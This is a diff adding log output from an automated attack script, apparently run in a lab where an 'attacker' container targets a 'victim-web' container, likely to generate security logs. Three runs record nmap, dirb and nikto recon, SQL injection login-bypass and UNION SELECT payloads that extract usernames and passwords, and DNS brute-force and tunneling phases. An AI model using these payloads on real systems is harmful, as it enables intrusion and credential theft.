@@ -1,0 +1,275 @@
+2025-07-23 19:25:23,396 - INFO - 🚀 Starting Enhanced Container-based SQL Injection Attack
+2025-07-23 19:25:23,396 - INFO - Container ID: attacker
+2025-07-23 19:25:23,396 - INFO - Target: http://victim-web:80
+2025-07-23 19:25:23,396 - INFO - Attack Type: sql_injection
+2025-07-23 19:25:23,396 - INFO - Variant ID: None
+2025-07-23 19:25:23,396 - INFO - Benign Only: False
+2025-07-23 19:25:23,396 - INFO - ============================================================
+2025-07-23 19:25:23,397 - INFO - === Testing Container Connectivity ===
+2025-07-23 19:25:23,401 - INFO - [+] Successfully connected to http://victim-web:80
+2025-07-23 19:25:23,401 - INFO - [CONTAINER] connectivity_test: {'status': 'success', 'status_code': 200}
+2025-07-23 19:25:23,401 - INFO - === Network Reconnaissance Phase ===
+2025-07-23 19:25:23,401 - INFO - Running: nmap -sS -p- victim-web
+2025-07-23 19:25:24,138 - INFO - [+] Nmap scan completed with return code: 0
+2025-07-23 19:25:29,143 - INFO - === Web Application Enumeration Phase ===
+2025-07-23 19:25:29,144 - INFO - Running: dirb http://victim-web:80 /usr/share/dirb/wordlists/common.txt -S -r
+2025-07-23 19:25:30,190 - INFO - [+] Dirb scan completed with return code: 0
+2025-07-23 19:25:30,190 - INFO - Running: nikto -h http://victim-web:80 -Format txt -o /opt/output/nikto_results.txt
+2025-07-23 19:25:37,465 - INFO - [+] Nikto scan completed with return code: 0
+2025-07-23 19:25:42,472 - INFO - === Custom SQL Injection Phase ===
+2025-07-23 19:25:42,478 - INFO - [+] Custom Login Attack 1: admin' --
+2025-07-23 19:25:42,498 - INFO -     Status: 200, SQL Error: False, Success: True
+2025-07-23 19:25:44,949 - INFO - [+] Custom Login Attack 2: admin' OR '1'='1
+2025-07-23 19:25:44,954 - INFO -     Status: 200, SQL Error: False, Success: True
+2025-07-23 19:25:46,276 - INFO - [+] Custom Login Attack 3: ' OR 1=1--
+2025-07-23 19:25:46,292 - INFO -     Status: 200, SQL Error: False, Success: True
+2025-07-23 19:25:47,979 - INFO - [+] Custom Login Attack 4: ' UNION SELECT 1,2,3--
+2025-07-23 19:25:48,005 - INFO -     Status: 200, SQL Error: True, Success: False
+2025-07-23 19:25:50,599 - INFO - [+] Custom Login Attack 5: admin'/*
+2025-07-23 19:25:50,611 - INFO -     Status: 200, SQL Error: False, Success: True
+2025-07-23 19:25:52,957 - INFO - [+] Custom Login Attack 6: ' OR 'x'='x
+2025-07-23 19:25:53,020 - INFO -     Status: 200, SQL Error: False, Success: False
+2025-07-23 19:25:55,126 - INFO - [+] Custom Search Attack 1: ' OR 1=1--
+2025-07-23 19:25:55,141 - INFO -     Status: 200, SQL Error: False, Time-based: False
+2025-07-23 19:25:57,226 - INFO - [+] Custom Search Attack 2: ' UNION SELECT 1,2,3,4,5--
+2025-07-23 19:25:57,236 - INFO -     Status: 200, SQL Error: False, Time-based: False
+2025-07-23 19:26:00,073 - INFO - [+] Custom Search Attack 3: ' AND (SELECT COUNT(*) FROM users)>0--
+2025-07-23 19:26:00,082 - INFO -     Status: 200, SQL Error: False, Time-based: False
+2025-07-23 19:26:02,923 - INFO - [+] Custom Search Attack 4: ' AND (SELECT SLEEP(3))--
+2025-07-23 19:26:02,931 - INFO -     Status: 200, SQL Error: False, Time-based: False
+2025-07-23 19:26:05,622 - INFO - [+] Custom Search Attack 5: ' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
+2025-07-23 19:26:05,632 - INFO -     Status: 200, SQL Error: False, Time-based: False
+2025-07-23 19:26:12,285 - INFO - === Data Extraction Phase ===
+2025-07-23 19:26:12,295 - INFO -     Found 1 columns in search query
+2025-07-23 19:26:12,295 - INFO - Attempting data extraction (Method 1): ' UNION SELECT 1,username,password,email,role FROM users--
+2025-07-23 19:26:12,302 - INFO -     Status: 200, Success: True
+2025-07-23 19:26:12,331 - INFO - Attempting data extraction (Method 2.1): OFFSET 0
+2025-07-23 19:26:12,334 - INFO -     Found user: admin
+2025-07-23 19:26:13,336 - INFO - Attempting data extraction (Method 2.2): OFFSET 1
+2025-07-23 19:26:13,348 - INFO -     Found user: alice
+2025-07-23 19:26:14,351 - INFO - Attempting data extraction (Method 2.3): OFFSET 2
+2025-07-23 19:26:14,360 - INFO -     Found user: bob
+2025-07-23 19:26:15,363 - INFO - Attempting data extraction (Method 2.4): OFFSET 3
+2025-07-23 19:26:15,377 - INFO -     Found user: guest
+2025-07-23 19:26:16,380 - INFO - Attempting data extraction (Method 2.5): OFFSET 4
+2025-07-23 19:26:16,392 - INFO -     Found user: john
+2025-07-23 19:26:17,395 - INFO - Attempting data extraction (Method 2.6): OFFSET 5
+2025-07-23 19:26:17,406 - INFO -     Found user: manager
+2025-07-23 19:26:18,409 - INFO - Attempting data extraction (Method 2.7): OFFSET 6
+2025-07-23 19:26:18,422 - INFO -     Found user: test
+2025-07-23 19:26:19,424 - INFO - Attempting data extraction (Method 2.8): OFFSET 7
+2025-07-23 19:26:19,439 - INFO -     Found user: user1
+2025-07-23 19:26:20,441 - INFO - Attempting data extraction (Method 2.9): OFFSET 8
+2025-07-23 19:26:20,454 - INFO -     Found user: user1
+2025-07-23 19:26:21,457 - INFO - Attempting data extraction (Method 2.10): OFFSET 9
+2025-07-23 19:26:21,472 - INFO -     Found user: test
+2025-07-23 19:26:22,476 - INFO - [+] Extracted 10 users, saved to /opt/output/extracted_data.html
+2025-07-23 19:26:22,477 - INFO - === DNS Attack Phase ===
+2025-07-23 19:26:22,477 - INFO - Generating DNS proxy logs...
+2025-07-23 19:26:22,480 - INFO - Generated 5 DNS proxy log entries
+2025-07-23 19:26:22,480 - INFO - Generating HTTP proxy logs...
+2025-07-23 19:26:22,481 - INFO - Generated 5 HTTP proxy log entries
+2025-07-23 19:26:22,482 - INFO - DNS Attack Configuration: {'enabled': True, 'phases': ['reconnaissance', 'brute_force', 'cache_poisoning', 'tunneling'], 'intensity': 'medium', 'delay_between_queries': '1-3', 'subdomain_wordlist_size': 60}
+2025-07-23 19:26:22,482 - ERROR - DNS attack phase failed: __init__() missing 1 required positional argument: 'target_domain'
+2025-07-23 19:26:22,482 - INFO - === Saving Attack Results ===
+2025-07-23 19:26:22,483 - INFO - [+] Scan results saved to /opt/output/scan_results.json
+2025-07-23 19:26:22,486 - INFO - [+] SQL injection results saved to /opt/output/sql_injection_results.json
+2025-07-23 19:26:22,487 - INFO - [+] Container attack log saved to /opt/output/container_attack_log.json
+2025-07-23 19:26:22,490 - INFO - [+] Detailed attack summary saved to /opt/output/attack_summary.txt
+2025-07-23 19:26:22,491 - INFO - 
+[ATTACK_END] 2025-07-23T19:26:22.482466
+2025-07-23 19:26:22,492 - INFO - 
+✅ Enhanced container attack completed!
+2025-07-23 19:26:22,492 - INFO - Check the following for attack data:
+2025-07-23 19:26:22,493 - INFO - - Container logs: docker logs securitylogs-attacker
+2025-07-23 19:26:22,493 - INFO - - Attack log: /opt/output/container_attack_log.json
+2025-07-23 19:26:22,493 - INFO - - Scan results: /opt/output/scan_results.json
+2025-07-23 19:26:22,493 - INFO - - SQL injection results: /opt/output/sql_injection_results.json
+2025-07-23 19:26:22,494 - INFO - - Attack summary: /opt/output/attack_summary.txt
+2025-07-23 19:26:22,494 - INFO - - Extracted data: /opt/output/extracted_data.html
+2025-07-24 00:24:56,197 - INFO - 🚀 Starting Enhanced Container-based SQL Injection Attack
+2025-07-24 00:24:56,197 - INFO - Container ID: attacker
+2025-07-24 00:24:56,197 - INFO - Target: http://victim-web:80
+2025-07-24 00:24:56,197 - INFO - Attack Type: sql_injection
+2025-07-24 00:24:56,197 - INFO - Variant ID: None
+2025-07-24 00:24:56,198 - INFO - Benign Only: False
+2025-07-24 00:24:56,198 - INFO - ============================================================
+2025-07-24 00:24:56,198 - INFO - === Testing Container Connectivity ===
+2025-07-24 00:24:56,201 - INFO - [+] Successfully connected to http://victim-web:80
+2025-07-24 00:24:56,202 - INFO - [CONTAINER] connectivity_test: {'status': 'success', 'status_code': 200}
+2025-07-24 00:24:56,202 - INFO - === Network Reconnaissance Phase ===
+2025-07-24 00:24:56,202 - INFO - Running: nmap -sS -p- victim-web
+2025-07-24 00:24:56,891 - INFO - [+] Nmap scan completed with return code: 0
+2025-07-24 00:25:01,898 - INFO - === Web Application Enumeration Phase ===
+2025-07-24 00:25:01,899 - INFO - Running: dirb http://victim-web:80 /usr/share/dirb/wordlists/common.txt -S -r
+2025-07-24 00:25:02,966 - INFO - [+] Dirb scan completed with return code: 0
+2025-07-24 00:25:02,966 - INFO - Running: nikto -h http://victim-web:80 -Format txt -o /opt/output/nikto_results.txt
+2025-07-24 00:25:10,326 - INFO - [+] Nikto scan completed with return code: 0
+2025-07-24 00:25:15,334 - INFO - === Custom SQL Injection Phase ===
+2025-07-24 00:25:15,334 - INFO - [+] Custom Login Attack 1: admin' --
+2025-07-24 00:25:15,345 - INFO -     Status: 200, SQL Error: False, Success: True
+2025-07-24 00:25:17,237 - INFO - [+] Custom Login Attack 2: admin' OR '1'='1
+2025-07-24 00:25:17,256 - INFO -     Status: 200, SQL Error: False, Success: True
+2025-07-24 00:25:19,859 - INFO - [+] Custom Login Attack 3: ' OR 1=1--
+2025-07-24 00:25:19,869 - INFO -     Status: 200, SQL Error: False, Success: True
+2025-07-24 00:25:21,176 - INFO - [+] Custom Login Attack 4: ' UNION SELECT 1,2,3--
+2025-07-24 00:25:21,182 - INFO -     Status: 200, SQL Error: True, Success: False
+2025-07-24 00:25:22,827 - INFO - [+] Custom Login Attack 5: admin'/*
+2025-07-24 00:25:22,842 - INFO -     Status: 200, SQL Error: False, Success: True
+2025-07-24 00:25:24,259 - INFO - [+] Custom Login Attack 6: ' OR 'x'='x
+2025-07-24 00:25:24,261 - INFO -     Status: 200, SQL Error: False, Success: False
+2025-07-24 00:25:26,178 - INFO - [+] Custom Search Attack 1: ' OR 1=1--
+2025-07-24 00:25:26,236 - INFO -     Status: 200, SQL Error: False, Time-based: False
+2025-07-24 00:25:28,071 - INFO - [+] Custom Search Attack 2: ' UNION SELECT 1,2,3,4,5--
+2025-07-24 00:25:28,101 - INFO -     Status: 200, SQL Error: False, Time-based: False
+2025-07-24 00:25:29,354 - INFO - [+] Custom Search Attack 3: ' AND (SELECT COUNT(*) FROM users)>0--
+2025-07-24 00:25:29,360 - INFO -     Status: 200, SQL Error: False, Time-based: False
+2025-07-24 00:25:32,318 - INFO - [+] Custom Search Attack 4: ' AND (SELECT SLEEP(3))--
+2025-07-24 00:25:32,320 - INFO -     Status: 200, SQL Error: False, Time-based: False
+2025-07-24 00:25:33,748 - INFO - [+] Custom Search Attack 5: ' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
+2025-07-24 00:25:33,752 - INFO -     Status: 200, SQL Error: False, Time-based: False
+2025-07-24 00:25:41,189 - INFO - === Data Extraction Phase ===
+2025-07-24 00:25:41,200 - INFO -     Found 1 columns in search query
+2025-07-24 00:25:41,200 - INFO - Attempting data extraction (Method 1): ' UNION SELECT 1,username,password,email,role FROM users--
+2025-07-24 00:25:41,210 - INFO -     Status: 200, Success: True
+2025-07-24 00:25:41,234 - INFO - Attempting data extraction (Method 2.1): OFFSET 0
+2025-07-24 00:25:41,238 - INFO -     Found user: admin
+2025-07-24 00:25:42,240 - INFO - Attempting data extraction (Method 2.2): OFFSET 1
+2025-07-24 00:25:42,253 - INFO -     Found user: alice
+2025-07-24 00:25:43,256 - INFO - Attempting data extraction (Method 2.3): OFFSET 2
+2025-07-24 00:25:43,268 - INFO -     Found user: bob
+2025-07-24 00:25:44,270 - INFO - Attempting data extraction (Method 2.4): OFFSET 3
+2025-07-24 00:25:44,285 - INFO -     Found user: guest
+2025-07-24 00:25:45,288 - INFO - Attempting data extraction (Method 2.5): OFFSET 4
+2025-07-24 00:25:45,298 - INFO -     Found user: john
+2025-07-24 00:25:46,301 - INFO - Attempting data extraction (Method 2.6): OFFSET 5
+2025-07-24 00:25:46,314 - INFO -     Found user: manager
+2025-07-24 00:25:47,317 - INFO - Attempting data extraction (Method 2.7): OFFSET 6
+2025-07-24 00:25:47,328 - INFO -     Found user: test
+2025-07-24 00:25:48,331 - INFO - Attempting data extraction (Method 2.8): OFFSET 7
+2025-07-24 00:25:48,342 - INFO -     Found user: user1
+2025-07-24 00:25:49,345 - INFO - Attempting data extraction (Method 2.9): OFFSET 8
+2025-07-24 00:25:49,360 - INFO -     Found user: user1
+2025-07-24 00:25:50,364 - INFO - Attempting data extraction (Method 2.10): OFFSET 9
+2025-07-24 00:25:50,371 - INFO -     Found user: test
+2025-07-24 00:25:51,376 - INFO - [+] Extracted 10 users, saved to /opt/output/extracted_data.html
+2025-07-24 00:25:51,377 - INFO - === DNS Attack Phase ===
+2025-07-24 00:25:51,379 - INFO - Generating DNS proxy logs with attack traffic...
+2025-07-24 00:26:25,294 - INFO - Generated 22 DNS attack log entries
+2025-07-24 00:26:25,296 - INFO - DNS attack logs appended to /opt/output/proxy/dns_proxy_raw.jsonl
+2025-07-24 00:26:25,296 - INFO - Generating HTTP proxy logs...
+2025-07-24 00:26:25,300 - INFO - Generated 5 HTTP proxy log entries
+2025-07-24 00:26:25,301 - INFO - DNS Attack Configuration: {'enabled': True, 'target_domain': 'victim-web.local', 'phases': ['reconnaissance', 'brute_force', 'cache_poisoning', 'tunneling'], 'intensity': 'medium', 'delay_between_queries': '1-3', 'subdomain_wordlist_size': 60}
+2025-07-24 00:26:25,302 - INFO - Executing DNS reconnaissance...
+2025-07-24 00:26:30,191 - INFO - Executing DNS brute force...
+2025-07-24 00:26:32,748 - INFO - Executing DNS tunneling...
+2025-07-24 00:26:35,146 - INFO - DNS attack phase completed successfully
+2025-07-24 00:26:35,148 - INFO - === Saving Attack Results ===
+2025-07-24 00:26:35,151 - INFO - [+] Scan results saved to /opt/output/scan_results.json
+2025-07-24 00:26:35,157 - INFO - [+] SQL injection results saved to /opt/output/sql_injection_results.json
+2025-07-24 00:26:35,165 - INFO - [+] Container attack log saved to /opt/output/container_attack_log.json
+2025-07-24 00:26:35,166 - INFO - [+] Detailed attack summary saved to /opt/output/attack_summary.txt
+2025-07-24 00:26:35,166 - INFO - 
+[ATTACK_END] 2025-07-24T00:26:35.147862
+2025-07-24 00:26:35,166 - INFO - 
+✅ Enhanced container attack completed!
+2025-07-24 00:26:35,166 - INFO - Check the following for attack data:
+2025-07-24 00:26:35,166 - INFO - - Container logs: docker logs securitylogs-attacker
+2025-07-24 00:26:35,166 - INFO - - Attack log: /opt/output/container_attack_log.json
+2025-07-24 00:26:35,167 - INFO - - Scan results: /opt/output/scan_results.json
+2025-07-24 00:26:35,167 - INFO - - SQL injection results: /opt/output/sql_injection_results.json
+2025-07-24 00:26:35,167 - INFO - - Attack summary: /opt/output/attack_summary.txt
+2025-07-24 00:26:35,167 - INFO - - Extracted data: /opt/output/extracted_data.html
+2025-07-24 01:57:02,517 - INFO - 🚀 Starting Enhanced Container-based SQL Injection Attack
+2025-07-24 01:57:02,518 - INFO - Container ID: attacker
+2025-07-24 01:57:02,518 - INFO - Target: http://victim-web:80
+2025-07-24 01:57:02,518 - INFO - Attack Type: sql_injection
+2025-07-24 01:57:02,519 - INFO - Variant ID: None
+2025-07-24 01:57:02,519 - INFO - Benign Only: False
+2025-07-24 01:57:02,519 - INFO - ============================================================
+2025-07-24 01:57:02,519 - INFO - === Testing Container Connectivity ===
+2025-07-24 01:57:02,522 - INFO - [+] Successfully connected to http://victim-web:80
+2025-07-24 01:57:02,523 - INFO - [CONTAINER] connectivity_test: {'status': 'success', 'status_code': 200}
+2025-07-24 01:57:02,523 - INFO - === Network Reconnaissance Phase ===
+2025-07-24 01:57:02,523 - INFO - Running: nmap -sS -p- victim-web
+2025-07-24 01:57:03,279 - INFO - [+] Nmap scan completed with return code: 0
+2025-07-24 01:57:08,284 - INFO - === Web Application Enumeration Phase ===
+2025-07-24 01:57:08,285 - INFO - Running: dirb http://victim-web:80 /usr/share/dirb/wordlists/common.txt -S -r
+2025-07-24 01:57:09,422 - INFO - [+] Dirb scan completed with return code: 0
+2025-07-24 01:57:09,422 - INFO - Running: nikto -h http://victim-web:80 -Format txt -o /opt/output/nikto_results.txt
+2025-07-24 01:57:16,537 - INFO - [+] Nikto scan completed with return code: 0
+2025-07-24 01:57:21,543 - INFO - === Custom SQL Injection Phase ===
+2025-07-24 01:57:21,544 - INFO - [+] Custom Login Attack 1: admin' --
+2025-07-24 01:57:21,553 - INFO -     Status: 200, SQL Error: False, Success: True
+2025-07-24 01:57:22,927 - INFO - [+] Custom Login Attack 2: admin' OR '1'='1
+2025-07-24 01:57:22,963 - INFO -     Status: 200, SQL Error: False, Success: True
+2025-07-24 01:57:25,619 - INFO - [+] Custom Login Attack 3: ' OR 1=1--
+2025-07-24 01:57:25,657 - INFO -     Status: 200, SQL Error: False, Success: True
+2025-07-24 01:57:27,546 - INFO - [+] Custom Login Attack 4: ' UNION SELECT 1,2,3--
+2025-07-24 01:57:27,565 - INFO -     Status: 200, SQL Error: True, Success: False
+2025-07-24 01:57:28,729 - INFO - [+] Custom Login Attack 5: admin'/*
+2025-07-24 01:57:28,740 - INFO -     Status: 200, SQL Error: False, Success: True
+2025-07-24 01:57:31,701 - INFO - [+] Custom Login Attack 6: ' OR 'x'='x
+2025-07-24 01:57:31,704 - INFO -     Status: 200, SQL Error: False, Success: False
+2025-07-24 01:57:34,247 - INFO - [+] Custom Search Attack 1: ' OR 1=1--
+2025-07-24 01:57:34,272 - INFO -     Status: 200, SQL Error: False, Time-based: False
+2025-07-24 01:57:37,190 - INFO - [+] Custom Search Attack 2: ' UNION SELECT 1,2,3,4,5--
+2025-07-24 01:57:37,194 - INFO -     Status: 200, SQL Error: False, Time-based: False
+2025-07-24 01:57:39,562 - INFO - [+] Custom Search Attack 3: ' AND (SELECT COUNT(*) FROM users)>0--
+2025-07-24 01:57:39,572 - INFO -     Status: 200, SQL Error: False, Time-based: False
+2025-07-24 01:57:40,623 - INFO - [+] Custom Search Attack 4: ' AND (SELECT SLEEP(3))--
+2025-07-24 01:57:40,627 - INFO -     Status: 200, SQL Error: False, Time-based: False
+2025-07-24 01:57:42,305 - INFO - [+] Custom Search Attack 5: ' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
+2025-07-24 01:57:42,317 - INFO -     Status: 200, SQL Error: False, Time-based: False
+2025-07-24 01:57:48,755 - INFO - === Data Extraction Phase ===
+2025-07-24 01:57:48,761 - INFO -     Found 1 columns in search query
+2025-07-24 01:57:48,761 - INFO - Attempting data extraction (Method 1): ' UNION SELECT 1,username,password,email,role FROM users--
+2025-07-24 01:57:48,764 - INFO -     Status: 200, Success: True
+2025-07-24 01:57:48,775 - INFO - Attempting data extraction (Method 2.1): OFFSET 0
+2025-07-24 01:57:48,777 - INFO -     Found user: admin
+2025-07-24 01:57:49,780 - INFO - Attempting data extraction (Method 2.2): OFFSET 1
+2025-07-24 01:57:49,790 - INFO -     Found user: alice
+2025-07-24 01:57:50,794 - INFO - Attempting data extraction (Method 2.3): OFFSET 2
+2025-07-24 01:57:50,804 - INFO -     Found user: bob
+2025-07-24 01:57:51,814 - INFO - Attempting data extraction (Method 2.4): OFFSET 3
+2025-07-24 01:57:51,832 - INFO -     Found user: guest
+2025-07-24 01:57:52,836 - INFO - Attempting data extraction (Method 2.5): OFFSET 4
+2025-07-24 01:57:52,847 - INFO -     Found user: john
+2025-07-24 01:57:53,849 - INFO - Attempting data extraction (Method 2.6): OFFSET 5
+2025-07-24 01:57:53,852 - INFO -     Found user: manager
+2025-07-24 01:57:54,854 - INFO - Attempting data extraction (Method 2.7): OFFSET 6
+2025-07-24 01:57:54,865 - INFO -     Found user: test
+2025-07-24 01:57:55,867 - INFO - Attempting data extraction (Method 2.8): OFFSET 7
+2025-07-24 01:57:55,880 - INFO -     Found user: user1
+2025-07-24 01:57:56,884 - INFO - Attempting data extraction (Method 2.9): OFFSET 8
+2025-07-24 01:57:56,902 - INFO -     Found user: user1
+2025-07-24 01:57:57,905 - INFO - Attempting data extraction (Method 2.10): OFFSET 9
+2025-07-24 01:57:57,917 - INFO -     Found user: test
+2025-07-24 01:57:58,921 - INFO - [+] Extracted 10 users, saved to /opt/output/extracted_data.html
+2025-07-24 01:57:58,921 - INFO - === DNS Attack Phase ===
+2025-07-24 01:57:58,921 - INFO - Generating DNS proxy logs with attack traffic...
+2025-07-24 01:58:59,469 - INFO - Generated 35 DNS attack log entries
+2025-07-24 01:58:59,471 - INFO - DNS attack logs appended to /opt/output/proxy/dns_proxy_raw.jsonl
+2025-07-24 01:58:59,471 - INFO - Generating HTTP proxy logs...
+2025-07-24 01:58:59,478 - INFO - Generated 5 HTTP proxy log entries
+2025-07-24 01:58:59,478 - INFO - DNS Attack Configuration: {'enabled': True, 'target_domain': 'victim-web.local', 'phases': ['reconnaissance', 'brute_force', 'cache_poisoning', 'tunneling'], 'intensity': 'medium', 'delay_between_queries': '1-3', 'subdomain_wordlist_size': 60}
+2025-07-24 01:58:59,479 - INFO - Executing DNS reconnaissance...
+2025-07-24 01:59:03,307 - INFO - Executing DNS brute force...
+2025-07-24 01:59:06,298 - INFO - Executing DNS tunneling...
+2025-07-24 01:59:08,864 - INFO - DNS attack phase completed successfully
+2025-07-24 01:59:08,865 - INFO - === Saving Attack Results ===
+2025-07-24 01:59:08,869 - INFO - [+] Scan results saved to /opt/output/scan_results.json
+2025-07-24 01:59:08,871 - INFO - [+] SQL injection results saved to /opt/output/sql_injection_results.json
+2025-07-24 01:59:08,872 - INFO - [+] Container attack log saved to /opt/output/container_attack_log.json
+2025-07-24 01:59:08,875 - INFO - [+] Detailed attack summary saved to /opt/output/attack_summary.txt
+2025-07-24 01:59:08,875 - INFO - 
+[ATTACK_END] 2025-07-24T01:59:08.865841
+2025-07-24 01:59:08,875 - INFO - 
+✅ Enhanced container attack completed!
+2025-07-24 01:59:08,875 - INFO - Check the following for attack data:
+2025-07-24 01:59:08,875 - INFO - - Container logs: docker logs securitylogs-attacker
+2025-07-24 01:59:08,875 - INFO - - Attack log: /opt/output/container_attack_log.json
+2025-07-24 01:59:08,875 - INFO - - Scan results: /opt/output/scan_results.json
+2025-07-24 01:59:08,875 - INFO - - SQL injection results: /opt/output/sql_injection_results.json
+2025-07-24 01:59:08,875 - INFO - - Attack summary: /opt/output/attack_summary.txt
+2025-07-24 01:59:08,875 - INFO - - Extracted data: /opt/output/extracted_data.html
